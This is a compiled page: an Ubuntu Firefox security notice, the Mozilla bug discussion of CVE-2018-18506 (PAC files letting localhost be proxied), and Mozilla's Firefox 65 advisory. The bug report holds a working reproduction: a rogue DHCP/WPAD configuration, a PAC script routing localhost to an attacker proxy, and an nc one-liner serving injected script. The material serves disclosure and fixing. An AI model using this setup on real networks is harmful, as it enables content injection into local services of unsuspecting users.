# USN-3874-1: Firefox vulnerabilities

30 January 2019

Firefox could be made to crash or run programs as your login if it
opened a malicious website.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

## Releases

* [Ubuntu 18.10](/security/notices?release=cosmic)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [firefox](/security/cves?package=firefox) - Mozilla Open Source web browser

## Details

Multiple security issues were discovered in Firefox. If a user were

tricked in to opening a specially crafted website, an attacker could

potentially exploit these to cause a denial of service, gain additional

privileges by escaping the sandbox, or execute arbitrary code.

([CVE-2018-18500](/security/CVE-2018-18500), [CVE-2018-18501](/security/CVE-2018-18501), [CVE-2018-18502](/security/CVE-2018-18502), [CVE-2018-18503](/security/CVE-2018-18503),

[CVE-2018-18504](/security/CVE-2018-18504), [CVE-2018-18505](/security/CVE-2018-18505))

It was discovered that Firefox allowed PAC files to specify that requests

to localhost are sent through the proxy to another server. If proxy

auto-detection is enabled, an attacker could potentially exploit this to

conduct attacks on local services and tools. ([CVE-2018-18506](/security/CVE-2018-18506))

User Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Steps to reproduce:
- install Firefox 63.0 in a Windows 10 VM, on a Linux host
- ensure that the network interface is connected to an empty host bridge and that the VM software does not act as a DHCP server
- configure a DHCP server on the host to send DHCP replies that point to a WPAD server, like this:
option wpad-url code 252 = text;
subnet 192.168.250.0 netmask 255.255.255.0 {
range 192.168.250.100 192.168.250.200;
option routers 192.168.250.1;
option wpad-url "<http://192.168.250.1:8080/proxy.pac>";
}
- run an HTTP server on the host, port 8080 (e.g. "python -m SimpleHTTPServer 8080"), serving a "proxy.pac" file with the following content:
function FindProxyForURL(url, host) {
if (dnsDomainIs(host, "localhost") || isInNet(dnsResolve(host), "127.0.0.0", "255.0.0.0")) {
return "PROXY 192.168.250.1:8081";
} else {
return "DIRECT";
}
}
- run `echo '<script>alert("hello from "+document.location)</script>' | nc -Nvlp 8081` on the host
- in the guest, in Firefox, open about:preferences; under General > Network Settings, click "Settings"
- tick "Auto-detect proxy settings for this network"
- click "OK"
- close Firefox in the guest
- disable and re-enable the guest's network interface (via Control Panel > Network and Internet > Network Connections)
- open Firefox on the guest
- navigate to <http://localhost/>
Thanks to eroman@ from Chrome Security for pointing out that this affects Firefox if the user has enabled proxy auto-detection.
Actual results:
Firefox connects to the proxy provided by the PAC script, and the JS code `alert("hello from "+document.location)` runs in the context of <http://localhost/>.
Expected results:
localhost should be special. There are applications that bind a web server to localhost and then use "Host" header checks to prevent DNS rebinding attacks. Such applications need to be protected from malicious outside traffic even if the network is malicious. Currently, Firefox does not special-case localhost in proxying decisions; this means that an attacker can abuse WPAD to gain the ability to serve attacker-controlled content at [http://localhost:\*/](http://localhost:*/)\* , at which point the attacker should be able to perform same-origin XHR to [http://localhost:\*/](http://localhost:*/)\* (e.g. by letting the PAC file specify "DIRECT" as fallback if the proxy goes down).

Jann, is there a need to use network-discovery of proxy settings for this to be a bug?
(I do understand that there's a different threat model for network-supplied proxy configuration)

When you are configuring the proxy manually, there is a field "No Proxy for" that is by default prefilled with "localhost,127.0.0.1". If you have not modified that preference, then we are apparently not respecting it for other than manual proxy configuration. Maybe that should change in Necko and then in the UI?

Re #2: I tested it, and I can reproduce the same behavior when a PAC URL has been manually configured. I believe that this is still, to some degree, a security problem if a PAC URL has been manually configured, but I believe that there is more obvious security impact if this is triggered by WPAD.
Re #4: My suggestion would be to also inhibit this behavior for a few other names. Looking around for software that attempts to protect itself against DNS rebinding:
CUPS uses the following code to verify the Host header (<https://github.com/apple/cups/blob/master/scheduler/client.c#L3565-L3576>); so all of the following host names should probably be excluded from (PAC-based) proxying:
return (!\_cups\_strcasecmp(con->clientname, "localhost") ||
!\_cups\_strcasecmp(con->clientname, "localhost.") ||
!strcmp(con->clientname, "127.0.0.1") ||
!strcmp(con->clientname, "[::1]"));
The devtools http handler of Chrome has a whitelisting function here: <https://cs.chromium.org/chromium/src/content/browser/devtools/devtools_http_handler.cc?l=106&gsn=RequestIsSafeToServe>
which whitelists localhost6, localhost6.localdomain6, localhost, localhost.localdomain, \*.localhost, and variations of that with a dot at the end.Flags: needinfo?(jannh)

I think that we show let localhost be localhost and assume a fixed mapping from localhost to 127.0.0.1 or ::1. We don't need to treat localhost6 or \*.localdomain specially. localhost is the only name that <https://datatracker.ietf.org/doc/html/draft-ietf-dnsop-let-localhost-be-localhost> blesses in this way.
It is possible that proxying connections to localhost do have use cases that depend on this. For instance, there might be an application, like Fiddler, that is used for diagnostic purposes that is inserted in this way. However, I think that we shouldn't entertain that possibility. We provide plenty of other ways of achieving that end, so my only suggestion there is to watch carefully when rolling this change out.Flags: needinfo?(martin.thomson)

I haven't found a clear explanation of why the CanUseProxy check is mode only for non-system/auto-detect proxy setting.
this also needs some changes to the prefs UI, I'm afraid (don't forget about TB,SM as well, unless prefs live in a shared toolkit code). the field for listing exceptions is disabled when one of autodetect/system is set, I think. that has to change to avoid confusion and bad UX, as those now apply for all proxy settings cases.
r+ only for the necko change, but we definitely need a UI patch as well, IMO.

As this is still marked a security issue, how would we proceed and get the associated UI logic fixed? (I looked, it's not likely something that I'd do myself.)
I think either we land the networking part first, and then file a follow-up issue to make sure the UI shows the exclude field for all proxy types or we invite a suitable UI-skilled person to submit a separate patch here so that they can land in tandem.
I would need advice on how to handle TB and SM prefs UI (if there's any)! The browser UI code looks specific for Firefox.
This issue is marked sec-moderate, which we according to the guidelines can land "without any explicit approval" so it's more about what's right from a bug-handling view.
What do you say Honza? I personally prefer the first: we land this, then do the follow-up changes separately.Flags: needinfo?(honzab.moz)

As discussed, we have to file a new security(?) UI/UX bug (I'd wait for Selena to figure out what we need here.) Not sure if this one should wait or not, really.
In my opinion, this should not be tracked as a security bug at all. Opening will somewhat untie our hands in landing/having dependencies.

This was reported to us thanks to investigation by the chrome team while working on their own version of this problem, <https://bugs.chromium.org/p/chromium/issues/detail?id=899126>. They're still treating theirs as a hidden security bug and we should honor that.
We can land this fix without unhiding the bug. We could also file an unhidden UX "feature request" to expose the exceptions field for all proxy types. Just don't say that not being able to edit the exceptions means there were no exceptions.Flags: needinfo?(dveditz)See Also: â <https://bugs.chromium.org/p/chromium/issues/detail?id=899126>Whiteboard: [necko-triaged] â [necko-triaged][keep hidden while crbug/899126 is]

Selena poked me about this bug. Gijs, can you help out with the UI changes? Sounds like we just need to have the UI always enable the "No Proxy for" field as being used for any form of proxy connection?
Also NIing mkaply as just a heads up, since this bug generally sounds like the kind of thing that enterprise users might be using.
Driveby comment: Are we sure we just want to rely on this field for localhost (as opposed to, say, a suitably scary sounding pref)? I'd sorta expect users and deployments to not really understand the impact of clearing localhost from those fields and allowing it to be proxied.
Driveby 2: The defaults for network.proxy.no\_proxies\_on are "localhost, 127.0.0.1". What happens with IPv6
Driveby 3 (help I have a problem): Are there cases where someone would \_want\_ the current behavior to prevent localhost sniffing? But I suppose that's really different class of problem?Flags: needinfo?(mozilla)Flags: needinfo?(gijskruitbosch+bugs)

I always believed that network.proxy.no\_proxies\_on was honored for all types even if it was disabled in those cases, and I think that other folks probably did too.
So I don't see a problem with moving this out to be the general case. If someone has a particular issue, they can just remove localhost from the no proxies case if necessary.Flags: needinfo?(mozilla)

I concur with this. While we could handle this in the UI only (ie make the UI enforce that localhost / 127.0.0.1 / ::1 are in the pref, when edited through said UI), that wouldn't prevent problems for users who either themselves or through a well-meaning/oblivious sysadmin manually configure the prefs (whether via our blessed enterprise deployment mechanisms or otherwise).
It's particularly pernicious because the vulnerability would be a result of omission, rather than explicitly opting in to unsafe behavior.
In practice, I believe that means we should add a block immediately after the mShutdown check in <https://searchfox.org/mozilla-central/rev/007b66c1f5f7a1b9a900a2038652a16a020f010c/netwerk/base/nsProtocolProxyService.cpp#1929> that force-adds the relevant entries. Then we can change the existing filter list pref's default to empty string.
:bagder, how does that sound? Was there maybe some discussion outside of this bug that led to the current patch?
I'm happy to provide a UI patch to always enable the edit field for the existing filter pref, but I think we should sort this question out, too. We could potentially show text above the filter textbox saying something like "localhost is never proxied", to clarify that it doesn't need to be in there.
If we want an opt-out, to avoid the vulnerable-by-omission issue, I think it should be more explicitly named, e.g. (strawman, please do suggest better alternatives) network.proxy.allow\_hijacking\_localhost (default false, of course). I would propose not having UI for this (beyond the obvious about:config).Flags: needinfo?(gijskruitbosch+bugs) â needinfo?(daniel)

> force-adds the relevant entries
I would be slightly concerned about the changed behavior for those 12 users (my guesstimate!) in the wild who actually have this pref changed and still actually and truly want to proxy localhost.
But I would also be fine if we instead would offer a different opt-out for localhost explicitly.
I think it boils down to making the UI sensible to users so that they don't shoot themselves too easily. If we deem the current style with a text field that contains the localhost versions is too easily used wrongly, then changing the localhost to an explicit opt-out is good.
(It is after all also possible that some of those 12 users changed it by mistake and now proxy localhost without it ever being intended...)Flags: needinfo?(daniel)

Per discussion with :bagder on IRC, I'll put up a small patch here ASAP to just always enable the edit field that we can land in this bug, and file a (sec-sensitive) follow-up for moving the localhost stuff into a separate pref.

I don't know the code here, so maybe I'm completely wrong, but the last test uses an IP address, but we rely on a proxy for mochitests, don't we?

The changes would prevent that unless you tweak the pref to specifically allow proxying. Try tweaking network.proxy.no\_proxies\_on to see if that fixes it.

The screenshot ( <https://taskcluster-artifacts.net/URrEOxguThmj_PZ6wsN_Mw/0/public/test_info//mozilla-test-fail-screenshot_zvOf90.png> ) from the test failure ( <https://treeherder.mozilla.org/#/jobs?repo=autoland&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&group_state=expanded&revision=02892fb6feaba4654eb127812b8a43147cc6690b&selectedJob=212696805> ) suggests this is right. It shows the new tab opened for the ip address test has loaded an error page. Now that we'll no longer use the proxy, the test tries to open <http://127.0.0.1/> (so at port 80), and uses:
await BrowserTestUtils.browserLoaded(tab.linkedBrowser, true);
which will wait for the browser to load a page. For various reasons that aren't really relevant here, error page loads "don't count", so the test will sit there forever waiting for a load in that browser. Presumably, when 127.0.0.1 is proxied, the proxy takes care of loading something there.
Sticking:

at the start of that subtest (ie first line in function ip\_address\_test) should work.

I'm running the patches on try now (<https://treeherder.mozilla.org/#/jobs?repo=try&revision=a5aa6edc18ec0b0c2f1fc7e2aaf61852f24f4bfa>) and the fixed test commit looks like this: <https://hg.mozilla.org/try/rev/157999d696022a78660e537720e2d6f6aa33288c>

Pretty sure this is just a pile of browser tests that need to have the pref flipped/changed so they don't break (or use a different URL).

Not sure what the backport story is on this bug, but I assume we'll want to let it bake on Nightly for a bit even if we do want to eventually uplift.

Yeah. I actually think it isn't particularly risky, but also that we're unlikely to gain much from nightly testing in that I doubt many of them use PACs. The automated tests were a bit of a nightmare mainly \*because\* we use PACs for all our mochitest/marionette-based (and maybe others?) automated tests... Honza, you reviewed the platform bits, would you agree that uplifting to beta 65 should be done?
I think for ESR, pushing a change like this is potentially too disruptive for enterprises... it's sec-moderate, so we could decide not to uplift. On the other hand, they're also the most likely victims here. I'd suggest posting to the enterprise list but I don't think there's anything actionable they can do if we don't uplift the patch... We could potentially do a version of the patch that implements the new behavior behind a secondary pref, which they can then enable, but that seems like a lot of effort for very small returns... Thoughts, Ryan?
In other news, we should document that accessing localhost/127.0.0.1 directly in tests is now going to need you to push a pref change in the test, but I'm not sure where to do that documenting... I think the best bet to spread awareness is to post to mailing lists like m.d.platform and fx-dev, but I don't really want to paint a bulls-eye on this security issue. Thoughts, Dan? Arguably, Chrome has kinda 0-day'd us here by opening up their issue anyway...Flags: needinfo?(ryanvm)Flags: needinfo?(honzab.moz)Flags: needinfo?(dveditz)

This is so specific case that I think uplifting is fine.
Corporate environments will likely get their PACs from trusted sources, so they are likely fine.
If someone plays with localhost while having a PAC setup, the one also likely knows what he/she is doing - is a power users or a developer and may already changed the prefs anyway. Those that don't know what they are doing (common users) will only benefit from this.
Honestly I'm kinda surprised this is kept so secretive. The change in default config like this should be more publicly communicated. Yeah, it's hard. It can also be used as an attack, potentially, in very special ceses.
So, yes, in favor of the beta uplift.Flags: needinfo?(honzab.moz)

Technically it's Google P0 that published (the Chrome bug is still hidden), but that should be good enough to unhide ours.URL: [https://bugs.chromium.org/p/project-z...](https://bugs.chromium.org/p/project-zero/issues/detail?id=1707)

v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch
[Beta/Release Uplift Approval Request]
Feature/Bug causing the regression: n/a
User impact if declined: Security issues with localhost access when using pac
Is this code covered by automated tests?: Yes
Has the fix been verified in Nightly?: No
Needs manual test from QE?: Yes
If yes, steps to reproduce: See [comment 0](/show_bug.cgi?id=1503393#c0 "RESOLVED FIXED - firefox permits proxying localhost via PAC")
List of other uplifts needed: n/a
Risk to taking this patch: Low
Why is the change risky/not risky? (and alternatives if risky): See [comment 53](/show_bug.cgi?id=1503393#c53 "RESOLVED FIXED - firefox permits proxying localhost via PAC"); This is a straightforward set of changes that effectively change when an existing pref applies, and had to update a number of tests purely because of the idiosyncratic nature of the testing setup of mochitests (which uses PAC to control network access, but some tests then also try to use 127.0.0.1 and expect it to be served by the PAC'd test server).
String changes made/needed: None

I'm inclined to let this wait for the next major ESR release rather than trying to backport, but that's not a strong feeling if others who better understand the risk vs. reward think it's a good idea to take on ESR60.

The last time I was playing with this was to use Windows Server 2016 trial and allow DHCP there, in an isolated Virtual Box NAT'ed network. The steps are here:

I created a new bridge interface by first placing the following in /etc/network/interfaces:
```
iface br0 inet static
address 192.168.250.1/24
```
and then running `ifup br0` (or something like that).
I created a VM with virt-manager, and set its networking as "Networking source: Specify shared device name" with device name "br0".
I installed the ISC dhcp server and added something like the following in /etc/dhcp/dhcpd.conf :
```
option domain-name-servers 8.8.8.8;
option wpad-url code 252 = text;
subnet 192.168.250.0 netmask 255.255.255.0 {
range 192.168.250.2 192.168.250.200;
option routers 192.168.250.1;
option wpad-url "<http://192.168.250.1:8080/proxy.pac>";
option wpad-url "file://c:/foobar/blah";
}
```
I stopped the systemd service isc-dhcp-server.service, changed /etc/default/isc-dhcp-server to make the DHCP server listen on the bridge interface in (`INTERFACESv4="br0"`), and then started the service again.

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: See [comment 68](/show_bug.cgi?id=1503393#c68 "RESOLVED FIXED - firefox permits proxying localhost via PAC")
* **User impact if declined**: Security issues with localhost access when using pac
* **Fix Landed on Version**: 66
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: See [comment 53](/show_bug.cgi?id=1503393#c53 "RESOLVED FIXED - firefox permits proxying localhost via PAC"); This is a straightforward set of changes that effectively change when an existing pref applies, and had to update a number of tests purely because of the idiosyncratic nature of the testing setup of mochitests (which uses PAC to control network access, but some tests then also try to use 127.0.0.1 and expect it to be served by the PAC'd test server).
* **String or UUID changes made by this patch**: no

Per discussion with Dan, this is a bug we should take on ESR since it's a publicly-disclosed issue more likely to affect enterprises. This fix shipped in Fx65 without any major fallout, so I agree with the risk assessment. Approved for 60.6esr.

Mike, how do we normally communicate these types of (security-sensitive) changes to enterprise users? While the localhost change won't matter much, this patch changes things such that "no proxy for" values also apply when "use system proxy settings" is in use. See also [bug 1524264](/show_bug.cgi?id=1524264 "VERIFIED FIXED - Move \"No Proxy for\" outside the radio button and change the case for design guidelines") (which we're hoping to also uplift so the UI is a bit more clear about that happening). This could be surprising for enterprises which use autoconfig or policy to use system proxy settings but somehow also have exceptions (or didn't bother locking the exceptions but wouldn't expect users to be able to "bypass" the system proxy in this way).

I would honestly just put it in release notes and maybe a note to the enterprise mailing list as to what changed (without saying why).

I have to agree with Mike -- enterprise IT will look at release notes first thing, and giving it exposure there will inform them of the change and what to expect. If there's a dedicated mailing list on top, exposing it there too will cover just about every serious enterprise use.

## Security vulnerabilities fixed in Firefox 65

Announced
January 29, 2019
Impact
critical
Products
Firefox
Fixed in

* Firefox 65

#### [#CVE-2018-18500: Use-after-free parsing HTML5 stream](#CVE-2018-18500)

Reporter
Yaniv Frank with SophosLabs
Impact
critical
##### Description

A use-after-free vulnerability can occur while parsing an HTML5 stream in concert with custom HTML elements. This results in the stream parser object being freed while still in use, leading to a potentially exploitable crash.

* [Bug 1510114](https://bugzilla.mozilla.org/show_bug.cgi?id=1510114)

#### [#CVE-2018-18504: Memory corruption and out-of-bounds read of texture client buffer](#CVE-2018-18504)

Reporter
Markus Vervier of X41 D-SEC GmbH
Impact
high
##### Description

A crash and out-of-bounds read can occur when the buffer of a texture client is freed while it is still in use during graphic operations. This results in a potentially exploitable crash and the possibility of reading from the memory of the freed buffers.

* [Bug 1496413](https://bugzilla.mozilla.org/show_bug.cgi?id=1496413)

#### [#CVE-2018-18505: Privilege escalation through IPC channel messages](#CVE-2018-18505)

Reporter
Jed Davis
Impact
high
##### Description

An earlier fix for an Inter-process Communication (IPC) vulnerability, CVE-2011-3079, added authentication to communication between IPC endpoints and server parents during IPC process creation. This authentication is insufficient for channels created after the IPC process is started, leading to the authentication not being correctly applied to later channels. This could allow for a sandbox escape through IPC channels due to lack of message validation in the listener process.

* [CVE-2011-3079](https://bugzilla.mozilla.org/show_bug.cgi?id=1087565)

#### [#CVE-2018-18503: Memory corruption with Audio Buffer](#CVE-2018-18503)

Reporter
Nils
Impact
moderate
##### Description

When JavaScript is used to create and manipulate an audio buffer, a potentially exploitable crash may occur because of a compartment mismatch in some situations.

#### [#CVE-2018-18506: Proxy Auto-Configuration file can define localhost access to be proxied](#CVE-2018-18506)

Reporter
Jann Horn
Impact
moderate
##### Description

When proxy auto-detection is enabled, if a web server serves a Proxy Auto-Configuration (PAC) file or if a PAC file is loaded locally, this PAC file can specify that requests to the localhost are to be sent through the proxy to another server. This behavior is disallowed by default when a proxy is manually configured, but when enabled could allow for attacks on services and tools that bind to the localhost for networked behavior if they are accessed through browsing.

#### [#CVE-2018-18502: Memory safety bugs fixed in Firefox 65](#CVE-2018-18502)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Arthur Iakab, Christoph Diehl, Christian Holler, Kalel, Emilio Cobos Ãlvarez, Cristina Coroiu, Noemi Erli, Natalia Csoregi, Julian Seward, Gary Kwong, Tyson Smith, Yaron Tausky, and Ronald Crane reported memory safety bugs present in Firefox 64. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.
